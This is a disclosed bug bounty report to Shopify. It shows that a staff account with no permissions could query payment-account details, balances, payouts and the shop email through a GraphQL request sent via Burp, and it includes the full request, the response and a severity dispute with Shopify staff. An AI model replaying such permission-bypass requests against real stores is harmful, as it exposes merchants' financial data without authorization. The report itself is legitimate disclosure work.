title: Using GraphQL, STAFF with NO explicit permissions on Store can retrieve Shopify Payments Balance.

profile.name: Shopify
profile.about: Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.

vulnerability_information_html:
Hi,

I am reporting this because it looks like a authorization bug in GraphQL. A staff member having no explicit permissions on a Shopify Store may be able to retrieve the Current balances in all currencies for the account for Shopify Payments.

Steps

  1. STAFF account is created and assigned NO permissions on a Shop by Owner/Admin

  2. STAFF then logs in to shop. Notice that STAFF is not having any access to menus/ HOME section.

  3. Now STAFF triggers the below GraphQL request via a burp proxy.

POST /admin/api/graphql HTTP/1.1
Host: vir444.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
x-shopify-web-force-proxy: 1
origin: https://vir444.myshopify.com
Content-Length: 2999
Cookies: [....]

{"operationName":"HomeIndex","variables":{"localTime":"22:59"},"query":"query HomeIndex($localTime: DateTime!) {
  staffMember {
    id
    privateData {
      activityFeed(first: 3) {
        edges {
          ...ActivityFeed
          __typename
        }
        __typename
      }
      capital {
        ... on HomeCapitalSummary {
          ...CapitalFeature
          __typename
        }
        __typename
      }
      greeting(clientDatetime: $localTime) {
        body
        heading
        __typename
      }
      notifications {
        ... on HomeNotification {
          ...Notifications
          __typename
        }
        __typename
      }
      onboarding {
        ... on HomeOnboarding {
          ...Onboarding
          __typename
        }
        __typename
      }
      tasks {
        ... on HomeTask {
          ...OrderTasks
          __typename
        }
        __typename
      }
      __typename
    }
    __typename
  }
  shop {
    betaOnboarding: beta(name: \"home_onboarding_web\")
    betaSlice: beta(name: \"home_slice\")
    email
    features {
      storefront
      __typename
    }
    id
    shopifyPaymentsAccount {
      balance {
        ... on MoneyV2 {
          ...Balance
          __typename
        }
        __typename
      }
      payouts(first: 2, reverse: true) {
        edges {
          ... on ShopifyPaymentsPayoutEdge {
            ...Payout
            __typename
          }
          __typename
        }
        __typename
      }
      __typename
    }
    __typename
  }
}

fragment ActivityFeed on ActivityEdge {
  cursor
  node {
    author
    createdAt
    messages
    topic
    attributed
    __typename
  }
  __typename
}

fragment CapitalFeature on HomeCapitalSummary {
  balanceProgress
  balanceRemaining {
    amount
    currencyCode
    __typename
  }
  paybackAmount {
    amount
    currencyCode
    __typename
  }
  __typename
}

fragment Balance on MoneyV2 {
  amount
  currencyCode
  __typename
}

fragment Payout on ShopifyPaymentsPayoutEdge {
  node {
    gross {
      amount
      currencyCode
      __typename
    }
    id
    issuedAt
    status
    __typename
  }
  __typename
}

fragment Onboarding on HomeOnboarding {
  feedbackOptions
  heading
  tagName
  tasks {
    buttons {
      text
      url
      __typename
    }
    completed
    iconKey
    image {
      originalSrc
      __typename
    }
    label
    message
    title
    __typename
  }
  __typename
}

fragment OrderTasks on HomeTask {
  badge {
    status
    title
    __typename
  }
  handle
  icon {
    originalSrc
    __typename
  }
  title
  url
  __typename
}

fragment Notifications on HomeNotification {
  button {
    text
    url
    __typename
  }
  dismissible
  dismissMessage
  id
  message
  severity
  title
  __typename
}
"}

Observer the response

{
    "data": {
        "shop": {
            "betaSlice": true, 
            "__typename": "Shop", 
            "features": {
                "__typename": "ShopFeatures", 
                "storefront": true
            }, 
            "shopifyPaymentsAccount": {
                "__typename": "ShopifyPaymentsAccount", 
                "payouts": {
                    "__typename": "ShopifyPaymentsPayoutConnection", 
                    "edges": []
                }, 
                "balance": []
            }, 
            "betaOnboarding": true, 
            "id": "gid://shopify/Shop/5282726001", 
            "email": "a@gmail.com"
        },

Impact

There are 2 issues which I noticed here,

  1. The response indicated that the store is using shopifyPayments as means of settling payouts between customers, merchants & store owners. This information should have been hidden since the STAFF running the GraphQL query had no settings permission assigned to his role. This means STAFF must ideally not know what is/are the payment providers which are applicable for the store.

  2. The response indicates an array called balances which I think is the place holder to retrieve the Current balances in all currencies for the account used for Shopify Payments on the store. Since my store did not do any transactions, the array is left empty. I suspect that had there been any Shopify Payments transactions in store, the balance of those will be reflected back into the balances parameter in the above GraphQL response. I believe payments/billing related information must not be visible/displayed to the STAFF especially when he has no- explicit permission assigned on the store.

activities.message:
Thanks for the update @clayton. But would you please care to explain why this was lowered to a LOW issue?

I actually thought this would have been worth a little more since you right mentioned that this falls into the category of "Circumvention of user permission model". The STAFF member over here was not assigned literally no permissions at all and yet he was able to view `Shopify Payments` balance of store. Had a STAFF had some sort of permission(s) other than `Settings` permission and was able to to view the balances would make the report fall into the bucket of this being rewarded with a minimum bounty but since the STAFF had no permissions what so ever and still was able to fetch payment balances IMO bumps up the severity to a MEDIUM at least.

At the end, I respect Shopify's decision but just wanted to voice out my opinion regarding the severity. Thanks anyways and wish you all a Merry Christmas & Happy New Year!!

Cheers,
@h13-

activities.message:
> The STAFF member over here was not assigned literally no permissions at all

The permissions control access to certain parts of the admin panel; other parts of it are intentionally accessible to all staff members. Even if all the permissions boxes are unchecked, the staff member still has permission to access some things.

In this case, it was not intended for Shopify payments details to be available to all staff members. Our bounty payout and severity rating were based on the nature of the information that was unintentionally exposed. We believe it was only sufficient to justify the minimum bounty payout for this category.

All the best,
@clayton
